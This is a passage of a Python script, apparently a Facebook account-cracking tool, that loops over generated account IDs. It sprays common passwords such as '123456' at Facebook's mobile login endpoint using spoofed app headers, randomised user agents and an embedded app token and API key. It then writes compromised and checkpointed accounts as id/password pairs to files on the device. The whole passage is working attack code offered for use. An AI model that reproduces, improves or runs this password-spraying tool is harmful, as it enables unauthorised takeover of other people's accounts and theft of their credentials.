    	    print(f"{vb} TOTAL IDS {vcv} {total_ids} ")
    	    print(f"{vb} IF NO RESULT TURN ON{G}/{W}OFF APN MODE EVERY 5 MIN")
    	    linex()
    	    for love in self.gen:
    	        ids = _Y_e_A_r_ + love
    	        __OL__.submit(self._O_l_D_,ids)
    	print("\033[1;37m")
    	linex()
    	print(f"{vb} THE PROCESS HAS COMPLETED...!")
    	print(f"{vb} TOTAL OK/CP {vcv}{B} "+str(len(self.oks))+f"{G}/{Y}"+str(len(self.cps)))
    	linex()
    	print(f"{vb} THANKS FOR USING.....! ")
#-_-_-_-_-_-_-_-<-OLD-M->-_-_-_-_-_-_-_-#
    def _O_l_D_(self,ids):
    	try:
    	    global loop,oks,cps
    	    coloor = random.choice(["\x1b[38;5;1m","\x1b[38;5;2m","\x1b[38;5;3m","\x1b[38;5;4m","\x1b[38;5;5m","\x1b[38;5;6m","\x1b[38;5;7m","\x1b[38;5;8m","\x1b[38;5;9m","\x1b[38;5;10m","\x1b[38;5;11m","\x1b[38;5;12m","\x1b[38;5;13m","\x1b[38;5;14m","\x1b[38;5;15m","\x1b[38;5;16m","\x1b[38;5;17m","\x1b[38;5;18m","\x1b[38;5;19m","\x1b[38;5;20m","\x1b[38;5;21m","\x1b[38;5;22m","\x1b[38;5;23m","\x1b[38;5;24m","\x1b[38;5;25m","\x1b[38;5;26m","\x1b[38;5;27m","\x1b[38;5;28m","\x1b[38;5;29m","\x1b[38;5;30m","\x1b[38;5;31m","\x1b[38;5;32m","\x1b[38;5;33m","\x1b[38;5;34m","\x1b[38;5;35m","\x1b[38;5;36m","\x1b[38;5;37m","\x1b[38;5;38m","\x1b[38;5;39m","\x1b[38;5;40m","\x1b[38;5;41m","\x1b[38;5;42m","\x1b[38;5;43m","\x1b[38;5;44m","\x1b[38;5;45m","\x1b[38;5;46m","\x1b[38;5;47m","\x1b[38;5;48m","\x1b[38;5;49m","\x1b[38;5;50m","\x1b[38;5;51m","\x1b[38;5;52m","\x1b[38;5;53m","\x1b[38;5;54m","\x1b[38;5;55m","\x1b[38;5;56m","\x1b[38;5;57m","\x1b[38;5;58m","\x1b[38;5;59m","\x1b[38;5;60m","\x1b[38;5;61m","\x1b[38;5;62m","\x1b[38;5;63m","\x1b[38;5;64m","\x1b[38;5;65m","\x1b[38;5;66m","\x1b[38;5;67m","\x1b[38;5;68m","\x1b[38;5;69m","\x1b[38;5;70m","\x1b[38;5;71m","\x1b[38;5;72m","\x1b[38;5;73m","\x1b[38;5;74m","\x1b[38;5;75m","\x1b[38;5;76m","\x1b[38;5;77m","\x1b[38;5;78m","\x1b[38;5;79m","\x1b[38;5;80m","\x1b[38;5;81m","\x1b[38;5;82m","\x1b[38;5;83m","\x1b[38;5;84m","\x1b[38;5;85m","\x1b[38;5;86m","\x1b[38;5;87m","\x1b[38;5;88m","\x1b[38;5;89m","\x1b[38;5;90m","\x1b[38;5;91m","\x1b[38;5;92m","\x1b[38;5;93m","\x1b[38;5;94m","\x1b[38;5;95m","\x1b[38;5;96m","\x1b[38;5;97m","\x1b[38;5;98m","\x1b[38;5;99m"])
    	    sys.stdout.write(f"\r\r{vb}{G}/{W}>{coloor}GIFT-O1{W}<{G}/{W}>{coloor}{self.loop}{W}<{G}/{W}>{B}{len(self.oks)}{W}<{G}/{W}>{Y}{len(self.cps)}{W}< ")
    	    sys.stdout.flush()
    	    for pas in ["123456","1234567","12345678","123456789","123123","143143"]:
                data = {
                'adid':str(uuid.uuid4()),
                'format': 'json',
                'device_id':str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id':str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password', 
                'error_detail_type': 'button_with_disabled', 
                'source': 'device_based_login', 
                'email':str(ids),
                'password':str(pas),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
                'generate_session_cookies': '1', 
                'meta_inf_fbmeta': '', 
                'advertiser_id':str(uuid.uuid4()),
                'currently_logged_in_userid': '0', 
                'locale': 'en_US',
                'client_country_code': 'US', 
                'method': 'auth.login', 
                'fb_api_req_friendly_name': 'authenticate', 
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
                'api_key': '882a8490361da98702bf97a021ddc14d'}
                headers = {
                'User-Agent': self.__OLD__(),
                'Content-Type': 'application/x-www-form-urlencoded', 
                'Host': 'graph.facebook.com', 
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE', 
                'X-Tigon-Is-Retry': 'False', 
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
                'x-fb-device-group': '5120', 
                'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
                'X-FB-Request-Analytics-Tags': 'graphservice', 
                'X-FB-HTTP-Engine': 'Liger', 
                'X-FB-Client-IP': 'True', 
                'X-FB-Server-Cluster': 'True', 
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
                'Content-Length': '706'}
                url = "https://b-graph.facebook.com/auth/login"
                po = requests.post(url,data=data,headers=headers).json()
                if "session_key" in po:
                    print(f"\r\r{vb}{G}/{W}>{B}NOOR-OK{W}< {vcv}{B} {ids}{G} / {B}{pas} \033[1;97m")
                    open('/sdcard/GIFT-BY-NOOR-OLD-OK.txt','a').write(ids+'/'+pas+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    print(f"\r\r{vb}{G}/{W}>{Y}NOOR-CP{W}< {vcv}{Y} {ids}{G} / {Y}{pas} \033[1;97m")
                    open('/sdcard/GIFT-BY-NOOR-OLD-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
    	    self.loop += 1
    	except Exception as e:
            pass
#-_-_-_-_-_-_-_-<-UA->-_-_-_-_-_-_-_-#
    def __UPX__(self):
    	ua1 = "[FBAN/FB4A;FBAV/388.0.0.32.105;FBBV/317616396;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/Banglalink;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9070;FBSV/2.3.6;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    	ua2 = "[FBAN/FB4A;FBAV/381.0.0.29.105;FBBV/316215288;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/FBCR/Teletalk;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/TA-1024;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    	ua3 = "[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=2016};FBLC/en_US;FBRV/FBCR/Grameenphone;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1721;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    	ua4 = "[FBAN/FB4A;FBAV/389.0.0.42.111;FBBV/317817218;FBDM/{density=4.0,width=1440,height=2368};FBLC/en_US;FBRV/FBCR/Robi;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto Z (2);FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    	ua5 = "[FBAN/FB4A;FBAV/377.0.0.22.107;FBBV/315414711;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Airtel;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    	__uaxx__ = random.choice([ua1,ua2,ua3,ua4,ua5])
    	__max__ = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{__uaxx__}'
    	return str(__max__)
#-_-_-_-_-_-_-_-<-UA-2->-_-_-_-_-_-_-_-#
    def __OLD__(self):
    	win_major = random.choice([10, 11])
    	chrome_major = random.choice(range(120, 123))
    	chrome_build = random.choice(range(0, 6000))
    	chrome_patch = random.choice(range(0, 200))
    	safari_version = 537
    	ua = (f"Mozilla/5.0 (Windows NT {win_major}.0; Win64; x64) "f"AppleWebKit/{safari_version}.36 (KHTML, like Gecko) "f"Chrome/{chrome_major}.0.{chrome_build}.{chrome_patch} Safari/{safari_version}.36")
    	return str(ua)
#-_-_-_-_-_-_-_-<-END-CALL->-_-_-_-_-_-_-_-#
if __name__ == "__main__":
    _G_i_F_t_()._M_e_N_u_()
#-_-_-_-_-_-_-_-<-END->-_-_-_-_-_-_-_-#